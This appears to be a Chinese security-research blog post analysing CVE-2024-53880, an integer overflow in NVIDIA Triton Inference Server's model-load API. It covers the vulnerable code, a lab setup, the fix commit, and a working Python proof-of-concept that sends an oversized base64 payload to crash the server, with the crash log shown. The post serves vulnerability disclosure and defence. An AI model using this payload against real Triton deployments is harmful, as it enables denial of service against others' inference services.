#  警惕！NVIDIA Triton推理服务器整数溢出漏洞曝光：原理、复现与修复全解析   
原创 mag1c7  山石网科安全技术研究院   2025-04-13 01:00  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxvbibNMMmxDGrTN0Z9ibYzXnSNKobTzADCPgdo1b7ukKNARFEicHqQiajWw/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8Jb8ZACqDjPdMzgicp2SzdZ19mFnVcBO53s1uA2cSfarQkwibVUeCeH9w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
****  
****  
**一个小小的整数溢出，竟可能引发整个推理服务的崩溃！**  
  
****  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NGIAw2Z6vnLKuKAwMiaYedpTAYugKibaTBsHzf5pDuztECgfIgOfpG5DRF31jzhosMEj23dlx186q0zgLaIZj9lA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
在当今人工智能飞速发展的时代，推理服务器作为模型部署的关键环节，其安全性至关重要。然而，即使是像NVIDIA Triton Inference Server这样被广泛使用的推理平台，也可能隐藏着潜在的安全隐患。近期，一个整数溢出漏洞（CVE-2024-53880）在Triton Inference Server中被发现，攻击者可以通过精心构造的数据触发该漏洞，导致堆溢出甚至服务  
崩溃。这不仅引发了安全领域的广泛关注，也提醒我们对软件安全的重视不容忽视。今天，就让我们深入剖析这个漏洞的原理、复现过程以及修复方法，一探究竟。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**一、漏洞描述**  
  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th data-colwidth="116"><section style="-webkit-tap-highlight-color: transparent;margin-right: 0px;margin-left: 0px;outline: 0px;letter-spacing: 0.544px;font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6em;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 15px;letter-spacing: 1px;text-indent: 0em;font-family: -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;visibility: visible;"><span textstyle="" style="letter-spacing: 1px;">CVE IDs Addressed</span></span></section></th><th><section style="-webkit-tap-highlight-color: transparent;margin-right: 0px;margin-left: 0px;outline: 0px;letter-spacing: 0.544px;font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6em;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 15px;letter-spacing: 1px;text-indent: 0em;font-family: -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;visibility: visible;"><span textstyle="" style="letter-spacing: 1px;">Affected Products</span></span></section></th><th><section style="-webkit-tap-highlight-color: transparent;margin-right: 0px;margin-left: 0px;outline: 0px;letter-spacing: 0.544px;font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6em;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 15px;letter-spacing: 1px;text-indent: 0em;font-family: -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;visibility: visible;"><span textstyle="" style="letter-spacing: 1px;">Platform or OS</span></span></section></th><th><section style="-webkit-tap-highlight-color: transparent;margin-right: 0px;margin-left: 0px;outline: 0px;letter-spacing: 0.544px;font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6em;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 15px;letter-spacing: 1px;text-indent: 0em;font-family: -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;visibility: visible;"><span textstyle="" style="letter-spacing: 1px;">Affec</span></span><span leaf="" style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 15px;letter-spacing: 1px;text-indent: 0em;font-family: -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;visibility: visible;"><span textstyle="" style="letter-spacing: 1px;">t</span></span><span leaf="" style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 15px;letter-spacing: 1px;text-indent: 0em;font-family: -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;visibility: visible;"><span textstyle="" style="letter-spacing: 1px;">ed Versions</span></span></section></th><th><section style="-webkit-tap-highlight-color: transparent;margin-right: 0px;margin-left: 0px;outline: 0px;letter-spacing: 0.544px;font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6em;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 15px;letter-spacing: 1px;text-indent: 0em;font-family: -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;visibility: visible;"><span textstyle="" style="letter-spacing: 1px;">Updated Version</span></span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td data-colwidth="116"><section style="-webkit-tap-highlight-color: transparent;margin-right: 0px;margin-left: 0px;outline: 0px;letter-spacing: 0.544px;font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6em;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 15px;letter-spacing: 1px;text-indent: 0em;font-family: -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;visibility: visible;"><span textstyle="" style="letter-spacing: 1px;">CVE-2024-53880</span></span></section></td><td><section style="-webkit-tap-highlight-color: transparent;margin-right: 0px;margin-left: 0px;outline: 0px;letter-spacing: 0.544px;font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6em;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 15px;letter-spacing: 1px;text-indent: 0em;font-family: -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;visibility: visible;"><span textstyle="" style="letter-spacing: 1px;">Triton Inference Server</span></span></section></td><td><section style="-webkit-tap-highlight-color: transparent;margin-right: 0px;margin-left: 0px;outline: 0px;letter-spacing: 0.544px;font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6em;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 15px;letter-spacing: 1px;text-indent: 0em;font-family: -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;visibility: visible;"><span textstyle="" style="letter-spacing: 1px;">Windows, Linux</span></span></section></td><td><section style="-webkit-tap-highlight-color: transparent;margin-right: 0px;margin-left: 0px;outline: 0px;letter-spacing: 0.544px;font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6em;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 15px;letter-spacing: 1px;text-indent: 0em;font-family: -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;visibility: visible;"><span textstyle="" style="letter-spacing: 1px;">24.11</span></span></section></td><td><section style="-webkit-tap-highlight-color: transparent;margin-right: 0px;margin-left: 0px;outline: 0px;letter-spacing: 0.544px;font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6em;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 15px;letter-spacing: 1px;text-indent: 0em;font-family: -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;visibility: visible;"><span textstyle="" style="letter-spacing: 1px;">24.12</span></span></section></td></tr></tbody></table>  
  
1.An  
 attacker can   
send specially crafted data to /v2/repository/models/<model_name>/load  
 to ==convert the param_len  
 variable from size_t  
 to const int  
 type,== triggering an integer overflow in the base64_decode_block  
 function and causing a heap overflow. [1]  
  
  
攻击者  
可以向  
/v2/r  
epository/models/<model_name>  
/load  
发送精心构造的数据，将  
param_len  
变量从  
size_t  
类型转换为  
const int  
类型，从而在   
base64_decode_block  
函数中触发整数溢出，并导致堆溢出。  
  
  
2.NVIDIA Triton Inference Server contains a vulnerability in the model loading API, where a user could cause an integer overflow or wraparound error by loading a model with an extra-large file size that overflows an internal variable. A successful exploit of this vulnerability might lead to denial of service. [2]  
  
  
NVIDIA Triton Inference Server在模型加载 API 中存在一个漏洞，用户可以通过加载一个超大文件大小的模型，导致内部变量溢出或环绕错误。成功利用此漏洞可能会导致拒绝服务。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**二、漏洞定位**  
  
  
src/http_server.cc#HTTPAPIServer::HandleCudaSharedMemory()  
  
```
[......]          size_t param_len = 0;                                                   //1、可控参数            RETURN_AND_RESPOND_IF_ERR(                req,                param_json.MemberAsString(m.c_str(), &param_str, &param_len));            TRITONSERVER_Parameter* param = nullptr;            if (m == "config") {              param = TRITONSERVER_ParameterNew(                  m.c_str(), TRITONSERVER_PARAMETER_STRING, param_str);            } elseif (m.rfind("file:", 0) == 0) {              // Decode base64              base64_decodestate s;              base64_init_decodestate(&s);              // The decoded can not be larger than the input...              binary_files.emplace_back(std::vector<char>(param_len + 1));              size_t decoded_size = base64_decode_block(                          //2、使用第三方组件                  param_str, param_len, binary_files.back().data(), &s);[......]
```  
  
  
第三方组件commit  
：  
- Introduce version info macros so programs may detect incompatible A… · libb64/libb64@1784b0d  
[3]  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTeoULx2fTpN6UicgxjXpD8S3mD5PvUPTtUDMojYjSmuUvibp5iaib3oKicv91oQZd2h1I9tKxtJrzHmqA/640?wx_fmt=png&from=appmsg "")  
  
  
在这个函数中，如果  
 length_in  
   
发生整数溢出并变成一个**负数**  
，  
那么  
 codechar  
   
就永远不会等于  
 code_in + length_in  
，程序将继续执行  
 fragment = base64_decode_value(*codechar++);  
，导致堆溢出并崩溃。  
  
  
In this function, if   
length_in  
 has an integer overflow and becomes a   
negative number  
, then   
codechar  
 can never be equal to   
code_in+length_in  
, and the program will continue to execute   
fragment = base64_decode_value(*codechar++);  
, resulting in a heap overflow and crash. [1]  
  
```
int base64_decode_block(const char* code_in, const int length_in, void* plaintext_out, base64_decodestate* state_in){    const char* codechar = code_in;    char* plainchar = plaintext_out;    int fragment;    *plainchar = state_in->plainchar;    switch (state_in->step)    {        for(;;)        {    case step_a:            do {                if (codechar == code_in+length_in)                {                    state_in->step = step_a;                    state_in->plainchar = *plainchar;                    return (int)(plainchar - (char *) plaintext_out);                }                fragment = base64_decode_value(*codechar++);            } while (fragment < 0);[......]
```  
  
  
这里使用的应该是commit之前版本，这时  
length_in  
为int，[1]中所展示的代码有误(上下文与代码矛盾)。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**三、漏洞验证**  
  
  
**（一）环境构建**  
  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
```
# Step 1: Create the example model repositorygit clone -b r24.10 https://github.com/triton-inference-server/server.gitcd server/docs/examples./fetch_models.sh# Step 2docker pull nvcr.io/nvidia/tritonserver:24.10-py3
```  
  
  
**（二）复现**  
  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
- 运行命令：  
docker run --rm -p8000:8000 -p8001:8001 -p8002:8002 -vmodel_repository:/models nvcr.io/nvidia/tritonserver:24.10-py3 tritonserver --model-repository=/models --model-control-mode=explicit --load-model='*' --log-verbose 1  
  
- 运行以下脚本：  
  
```
import requestsimport jsonimport base64def generate_evil_data():      original_data_length = 2147483648 * 3 // 4      random_data = b"A"*original_data_length      encoded_data = base64.b64encode(random_data)      encoded_length = len(encoded_data)      print("Base64 encoded data length: {}".format(encoded_length))      assert encoded_length == 2147483648, "Encoded data length does not match the required length."      return encoded_datadef post_payload(targe_url,data):      url = f"http://{targe_url}/v2/repository/models/hacker/load"      headers = {"Content-Type": "application/json"}      # Model configuration      model_config = {          "name": "hacker",          "backend": "onnxruntime",          "inputs": [              {                  "name": "INPUT0",                  "datatype": "FP32",                  "shape": [1]              }          ],          "outputs": [              {                  "name": "OUTPUT0",                  "data_type": "TYPE_INT32",                  "dims": [ 16 ],              }          ]      }      encoded_model_content = data      # Prepare the payload      payload = {          "parameters": {              "config": json.dumps(model_config),  # Convert model config to JSON string              "file:1/model.onnx": encoded_model_content  # Insert the encoded model file          }      }      # Send POST request      requests.post(url, headers=headers, json=payload)if __name__=="__main__":      payload = generate_evil_data()      post_payload("localhost:8000",payload)
```  
  
- Triton 服务器输出崩溃日志：  
  
```
  I1012 02:17:30.658054 1 infer_handler.h:1391] "Thread started for ModelStreamInferHandler"  I1012 02:17:30.658094 1 grpc_server.cc:2558] "Started GRPCInferenceService at 0.0.0.0:8001"  I1012 02:17:30.658522 1 http_server.cc:4704] "Started HTTPService at 0.0.0.0:8000"  I1012 02:17:30.706378 1 http_server.cc:362] "Started Metrics Service at 0.0.0.0:8002"  I1012 02:18:26.729035 1 http_server.cc:4590] "HTTP request: 2 /v2/repository/models/hacker/load"  Signal (11) received.   0# 0x00005608852D852D in tritonserver   1# 0x00007FF904109520 in /lib/x86_64-linux-gnu/libc.so.6   2# base64_decode_block in /lib/x86_64-linux-gnu/libb64.so.0d   3# 0x0000560885441723 in tritonserver   4# 0x000056088544577E in tritonserver   5# 0x0000560885AE5BB5 in tritonserver   6# 0x0000560885AEA415 in tritonserver   7# 0x0000560885AE87CE in tritonserver   8# 0x0000560885AF7830 in tritonserver   9# 0x0000560885B00160 in tritonserver  10# 0x0000560885B00BD7 in tritonserver  11# 0x0000560885AEC7A2 in tritonserver  12# 0x00007FF90415BAC3 in /lib/x86_64-linux-gnu/libc.so.6  13# clone in /lib/x86_64-linux-gnu/libc.so.6
```  
  
  
  
**（三）视频链接**  
  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
- https://drive.google.com/file/d/1pY9lAcfsqHUHPy8DGPnMLfY6jF2yndDS/view?usp=sharing  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**四、漏洞修复**  
  
  
commit :  
   
fix: Resolve inte  
g  
er overflow in Load API file decoding (#7787) · triton-inference-server  
/server@1bc36c3  
[4]  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**五、相关链接**  
  
  
[1]https://huntr.com/bounties/fe7e1695-aef0-465e-8aae-69af99485898  
  
[2]https://nvidia.custhelp.com/app/answers/detail/a_id/5612  
  
[3]https://github.com/libb64/libb64/commit/1784b0d4af6e1ea6e0b2959b319374e30ea3ba39#diff-6242899bb6a52bdba6a8f610736f5b6576d704b01432af0645f24b9a7368214e  
  
[4]https://github.com/triton-inference-server/server/commit/1bc36c3cc286e6823339b5184c9ed058e85ed911#diff-2d773636d85b98207338699c3cc2b9fc7d31f38e45131ca127dca73f45d4bbb2  
  
[5]  
https://www.cve.org/CVERecord?id=CVE-2024-53880  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8KrXv9sZf93yt4huq2kARyZSgmdnic40GayohIYiaD2FAkkAqJehJSMtQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
山石网科是中国网络安全行业的技术创新领导厂商，由一批知名网络安全技术骨干于2007年创立，并以首批网络安全企业的身份，于2019年9月登陆科创板（股票简称：山石网科，股票代码：688030）。  
  
现阶段，山石网科掌握30项自主研发核心技术，申请560多项国内外专利。山石网科于2019年起，积极布局信创领域，致力于推动国内信息技术创新，并于2021年正式启动安全芯片战略。2023年进行自研ASIC安全芯片的技术研发，旨在通过自主创新，为用户提供更高效、更安全的网络安全保障。目前，山石网科已形成了具备“全息、量化、智能、协同”四大技术特点的涉及  
基础设施安全、云安全、数据安全、应用安全、安全运营、工业互联网安全、信息技术应用创新、安全服务、安全教育等九大类产品服务，50余个行业和场景的完整解决方案。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxPibycdiaNQCI4PNojUk3eYCQDZs6c5zNMUkq7yFNeYQIxicAV33eHNdFA/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
